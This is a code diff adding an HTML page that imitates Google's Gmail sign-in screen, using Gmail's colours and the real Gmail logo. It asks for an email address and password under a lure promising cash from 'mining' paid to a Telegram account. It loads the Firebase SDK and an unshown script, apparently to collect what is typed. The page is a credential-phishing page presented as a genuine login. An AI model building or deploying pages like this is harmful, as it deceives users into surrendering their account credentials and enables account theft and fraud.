@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gmail Login Page</title>
+    <style>
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            background-color: #f1f1f1;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            max-width: 400px;
+            background-color: #ffffff;
+            padding: 40px 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+
+        .logo img {
+            width: 92px; /* Gmail logo width */
+            margin-bottom: 20px;
+        }
+
+        .login-form h2 {
+            font-size: 24px;
+            margin-bottom: 20px;
+            color: #202124; /* Gmail dark gray */
+        }
+
+        .login-form p {
+            font-size: 14px;
+            margin-bottom: 20px;
+            color: #5f6368; /* Gmail light gray */
+        }
+
+        .login-form input[type="email"],
+        .login-form input[type="password"],
+        .login-form button {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 15px;
+            border: 1px solid #dadce0; /* Gmail input border color */
+            border-radius: 5px;
+            font-size: 16px;
+            box-sizing: border-box;
+            background-color: #fff; /* White background */
+        }
+
+        .login-form button {
+            background-color: #1a73e8; /* Gmail blue */
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+
+        .login-form button:hover {
+            background-color: #0d5cb6; /* Darker shade of Gmail blue on hover */
+        }
+
+        .forgot-password {
+            text-align: left;
+            margin-top: 10px;
+            color: #5f6368; /* Gmail light gray */
+            font-size: 14px;
+        }
+
+        .forgot-password a {
+            color: #1a73e8;
+            text-decoration: none;
+        }
+
+        .create-account {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #5f6368; /* Gmail light gray */
+        }
+
+        .create-account a {
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: 600;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/logo_gmail_lockup_default_1x.png" alt="Gmail Logo">
+        </div>
+        <div class="login-form">
+            <p>SignIn with your email to continue mining and get your cash in your Telegram Account!</p>
+            <h2>Sign in</h2>
+            <form id="gmailForm" action="#" method="POST">
+                <input type="email" id="email" name="email" placeholder="Email or phone" required>
+                <br>
+                <input type="password" id="password" name="password" placeholder="Password" required>
+                <br>
+                <button type="submit">Next</button>
+            </form>
+            <div class="forgot-password">
+                <a href="#">Forgot password?</a>
+            </div>
+        </div>
+        <div class="create-account">
+            <p>New to Gmail? <a href="#">Create an account</a></p>
+        </div>
+    </div>
+</body>
+
+ <!-- Link to Firebase JavaScript SDK -->
+ <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/7.14.1-0/firebase.js"></script>
+ <!-- External JavaScript file -->
+ <script src="gm-app.js"></script>
+
+</html>
